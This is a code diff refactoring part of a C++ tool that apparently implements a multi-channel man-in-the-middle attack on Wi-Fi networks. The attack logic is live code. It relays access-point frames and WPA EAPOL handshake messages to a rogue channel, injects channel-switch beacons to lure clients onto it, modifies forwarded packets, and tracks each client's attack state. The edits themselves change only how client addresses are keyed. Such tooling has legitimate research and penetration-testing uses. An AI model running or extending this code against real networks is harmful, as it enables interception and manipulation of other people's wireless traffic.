@@ -1,9 +1,6 @@
 #include "attacks/mc_mitm/mc_mitm.h"
-
 #include <chrono>
-#include <utility>
 #include <tins/tins.h>
-
 #include "attacks/by_target/scan_AP.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
@@ -25,8 +22,8 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
         // return
     }
 
-    const bool might_forward = clients.contains(addr1.to_string()) &&
-            clients.at(addr1.to_string())->should_forward(*pdu);
+    const bool might_forward = clients.contains(addr1) &&
+            clients.at(addr1)->should_forward(*pdu);
 
     //print
     if(dot11.find_pdu<Dot11Deauthentication>() || dot11.find_pdu<Dot11Disassoc>())
@@ -38,7 +35,7 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
 
     // Forward na rogue channel
     if(might_forward){
-        const auto &client = clients.at(addr1.to_string());
+        const auto &client = clients.at(addr1);
         client->modify_packet(*pdu);
         sock_rogue->send(*pdu, netconfig.rogue_channel);
     }
@@ -46,14 +43,10 @@ void McMitm::handle_from_ap_real(const unique_ptr<PDU> &pdu, const Dot11 &dot11,
     if(dot11.find_pdu<Dot11Deauthentication>()) del_client(dot11.addr1());
 }
 
-bool McMitm::handle_action_real(PDU &pdu, const Dot11 &dot11) const{
+bool McMitm::handle_action_real(const HWAddress<6> &addr2, PDU &pdu, const Dot11 &dot11) const{
     if(dot11.type() != Dot11::MANAGEMENT || dot11.subtype() != 13) return false;
-
     if(dot11.wep()){
-        const HWAddress<6> src = const_cast<Dot11&>(dot11).serialize().size() >= 16
-                                 ? HWAddress<6>(const_cast<Dot11&>(dot11).serialize().data() + 10)
-                                 : HWAddress<6>();
-        if(src == ap_mac){
+        if(addr2 == ap_mac){
             log(LogLevel::DEBUG, "Real channel: encrypted Action -> rogue channel");
             sock_rogue->send(pdu, netconfig.rogue_channel);
         }
@@ -72,7 +65,7 @@ bool McMitm::handle_action_real(PDU &pdu, const Dot11 &dot11) const{
     const HWAddress<6> src(raw.data() + 10);
     const HWAddress<6> dst(raw.data() + 4);
 
-    if(src == ap_mac && clients.contains(dst.to_string())){
+    if(src == ap_mac && clients.contains(dst)){
         log(LogLevel::DEBUG, "Real channel: Action(cat={}) → rogue channel", category);
         sock_rogue->send(pdu, netconfig.rogue_channel);
         return true;
@@ -83,7 +76,7 @@ bool McMitm::handle_action_real(PDU &pdu, const Dot11 &dot11) const{
 bool McMitm::handle_eapol_real(const HWAddress<6> addr2, const HWAddress<6> addr1, PDU &pdu){
    if(addr2 == ap_mac){
         // EAPOL od AP → forward na rogue channel
-        if(is_eapol(pdu) && clients.contains(addr1.to_string())){
+        if(is_eapol(pdu) && clients.contains(addr1)){
             int eapol_msg = get_eapol_msg_num(pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
             sock_rogue->send(pdu, netconfig.rogue_channel);
@@ -118,7 +111,7 @@ void McMitm::handle_auth_from_client_real(const Dot11Authentication &auth) {
         log(LogLevel::WARNING, "Client {} is connecting on real channel, injecting CSA beacon to try to correct.",
             client_addr.to_string());
 
-    if(clients.contains(client_addr.to_string())) del_client(client_addr);
+    if(clients.contains(client_addr)) del_client(client_addr);
     send_csa_beacon(1, client_addr);
     send_csa_beacon();
 
@@ -138,7 +131,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
 
 
     if (handle_probe_real(addr2, *dot11)) return;
-    if(handle_action_real(*pdu, *dot11)) return;
+    if(handle_action_real(addr2, *pdu, *dot11)) return;
     //if(handle_eapol(addr2, addr1, *dot11)) return;
 
     if(dot11->addr1() == ap_mac){
@@ -147,18 +140,18 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
             handle_auth_from_client_real(*auth);
         }else if(dot11->find_pdu<Dot11Deauthentication>() || dot11->find_pdu<Dot11Disassoc>()){
             print_rx(LogLevel::INFO, "Real channel", *dot11);
-            del_client(addr2.to_string());
-        } else if(clients.contains(addr2.to_string())){
+            del_client(addr2);
+        } else if(clients.contains(addr2)){
             display_client_traffic(*dot11, "Real channel");
         } else if(addr2 == client_mac){
             display_client_traffic(*dot11, "Real channel");
         }
 
         // Sleep mode detection
-        if(dot11->power_mgmt() && clients.contains(addr2.to_string())){
-            const auto &client = clients.at(addr2.to_string());
+        if(dot11->power_mgmt() && clients.contains(addr2)){
+            const auto &client = clients.at(addr2);
             if(client->state < ClientState::Attack_Done){
-                log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2.to_string());
+                log(LogLevel::WARNING, "Client {} is going to sleep on real channel.", addr2);
                 Dot11Data null_frame{};
                 null_frame.type(Dot11::DATA);
                 null_frame.subtype(Dot11::DATA_NULL);
@@ -172,7 +165,7 @@ void McMitm::handle_rx_real_chan(const unique_ptr<PDU> &pdu, const vector<uint8_
         handle_from_ap_real(pdu, *dot11, addr1);
 
         // EAPOL od AP → forward na rogue channel
-        if(is_eapol(*pdu) && clients.contains(addr1.to_string())){
+        if(is_eapol(*pdu) && clients.contains(addr1)){
             int eapol_msg = get_eapol_msg_num(*pdu);
             log(LogLevel::INFO, "Real channel: EAPOL {} from AP ->  rogue channel", eapol_msg);
             if(eapol_msg == 1 || eapol_msg == 3) sock_rogue->send(*pdu, netconfig.rogue_channel);
